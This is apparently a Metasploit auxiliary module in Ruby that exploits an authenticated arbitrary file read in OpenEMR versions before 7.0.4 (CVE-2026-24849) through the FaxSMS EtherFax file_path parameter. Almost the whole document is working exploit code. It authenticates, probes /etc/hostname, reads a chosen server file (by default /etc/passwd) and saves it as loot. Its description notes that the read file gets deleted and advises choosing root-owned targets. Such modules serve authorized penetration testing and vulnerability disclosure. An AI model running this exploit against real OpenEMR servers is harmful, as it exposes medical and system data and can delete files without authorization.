##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenEMR prior to 7.0.4 Authenticated Arbitrary File Read',
        'Description' => %q{
          Exploits an authenticated arbitrary file read vulnerability in OpenEMR
          versions prior to 7.0.4 (CVE-2026-24849). The FaxSMS module's EtherFaxActions
          disposeDocument action passes the file_path parameter directly to
          file_get_contents() without sanitisation, allowing any authenticated user
          to read arbitrary server-side files. Note that the disposeDoc method calls
          unlink() on the target after reading, so prefer root-owned files that the
          web server user cannot delete.
        },
        'Author' => [
          'doany1',   # Original PoC author
          'Rezwanul Haque', # Contributor
          'AMENDER'   # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-24849'],
          ['EDB', '52610']
        ],
        'DisclosureDate' => '2026-01-15',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'OpenEMR username', 'admin']),
        OptString.new('PASSWORD', [false, 'OpenEMR password', '']),
        OptString.new('SITE', [true, 'OpenEMR site name', 'default']),
        OptString.new('TARGETFILE', [true, 'The remote file to read', '/etc/passwd'])
      ]
    )
  end

  def target_uri
    normalize_uri(datastore['TARGETURI'])
  end

  def faxsms_path
    normalize_uri(target_uri, 'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php')
  end

  def login_path
    normalize_uri(target_uri, 'interface', 'main', 'main_screen.php')
  end

  def login_page_path
    normalize_uri(target_uri, 'interface', 'login', 'login.php')
  end

  def authenticate
    print_status("Authenticating to OpenEMR as '#{datastore['USERNAME']}'...")

    # First, get the login page to establish a session and grab CSRF token
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => login_page_path,
      'vars_get' => {
        'site' => datastore['SITE']
      },
      'keep_cookies' => true
    )

    unless res
      print_error('Connection failed while fetching login page')
      return nil
    end

    # Extract CSRF token if present
    csrf_token = nil
    if res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/i
      csrf_token = ::Regexp.last_match(1)
      vprint_status("Found CSRF token: #{csrf_token}")
    end

    # Prepare login data
    post_data = {
      'new_login_session_management' => '1',
      'authProvider' => 'Default',
      'authUser' => datastore['USERNAME'],
      'clearPass' => datastore['PASSWORD'],
      'languageChoice' => '1'
    }

    post_data['csrf_token_form'] = csrf_token if csrf_token

    # Perform authentication
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => login_path,
      'vars_get' => {
        'auth' => 'login',
        'site' => datastore['SITE']
      },
      'vars_post' => post_data,
      'keep_cookies' => true
    )

    unless res
      print_error('Connection failed during authentication')
      return nil
    end

    return res
  end

  def read_remote_file(file_path)
    actions = ['disposeDocument', 'disposeDoc']

    actions.each do |action|
      vprint_status("Trying action: #{action}")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => faxsms_path,
        'vars_get' => {
          'site' => datastore['SITE'],
          'type' => 'fax',
          'serviceType' => 'etherfax',
          '_ACTION_COMMAND' => action,
          'file_path' => file_path,
          'action' => 'download'
        },
        'keep_cookies' => true
      )

      unless res
        print_error('Connection failed during file read request')
        return nil, 'connection'
      end

      body = res.body.to_s

      # Check for authentication failure
      if body.include?('login_screen.php?error=1')
        return nil, 'session'
      end

      # Check for file not found
      if body.include?('Problem with download')
        return nil, 'missing'
      end

      # Check for service not found
      if body.downcase.include?('service is not found') || body.downcase.include?('install or turn service')
        vprint_status("Service not found with action #{action}, trying next...")
        next
      end

      # Empty response means wrong action, try next
      if body.strip.empty?
        vprint_status("Empty response with action #{action}, trying next...")
        next
      end

      # Success
      return body, 'ok'
    end

    return nil, 'missing'
  end

  def run
    print_status("Target: #{rhost}:#{rport}")
    print_status("File to read: #{datastore['TARGETFILE']}")

    # Authenticate
    auth_res = authenticate
    return unless auth_res

    # Verify authentication by attempting to read a safe file
    print_status('Verifying authentication and vulnerability...')
    _, probe_status = read_remote_file('/etc/hostname')

    case probe_status
    when 'session'
      print_error('Login failed - check credentials and site name')
      return
    when 'connection'
      return
    when 'missing'
      print_warning('Logged in, but probe file read returned nothing.')
      print_warning('Confirm the Fax/SMS module is enabled with EtherFax as the provider.')
    else
      print_good('Authenticated; CVE-2026-24849 file-read confirmed.')
    end

    # Read the target file
    print_status("Reading file: #{datastore['TARGETFILE']}")
    content, status = read_remote_file(datastore['TARGETFILE'])

    case status
    when 'session'
      print_error('Session rejected (authentication/ACL problem)')
      return
    when 'connection'
      return
    when 'missing'
      print_error("'#{datastore['TARGETFILE']}' not found/readable, or Fax/SMS+EtherFax is not enabled")
      return
    when 'ok'
      print_good('File content:')
      print_line(content)

      # Store the loot
      loot_path = store_loot(
        'openemr.file',
        'text/plain',
        rhost,
        content,
        datastore['TARGETFILE'],
        'OpenEMR Arbitrary File Read'
      )
      print_good("File saved to: #{loot_path}")

      # Report the vulnerability
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references,
        info: "Successfully read #{datastore['TARGETFILE']}"
      )
    end
  end
end
